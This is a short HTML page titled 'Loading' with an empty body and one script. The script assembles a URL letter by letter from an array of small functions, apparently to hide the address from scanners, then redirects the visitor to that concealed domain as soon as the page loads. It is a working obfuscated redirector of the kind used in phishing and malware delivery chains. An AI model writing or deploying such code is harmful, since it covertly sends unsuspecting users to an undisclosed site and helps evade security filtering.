<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            _ => 't',
            () => 't',
            _ => 'p',
            _ => 's',
            () => ':',
            () => '/',
            () => '/',
            () => 'v',
            function() { return 'e'; },
            () => 'r',
            () => 'g',
            _ => 'e',
            _ => 'n',
            _ => '.',
            function() { return 'c'; },
            _ => 'l',
            () => 'i',
            () => 'c',
            function() { return 'k'; },
            function() { return '/'; },
            () => 's',
            () => '/',
            () => 'n',
            function() { return 'e'; },
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
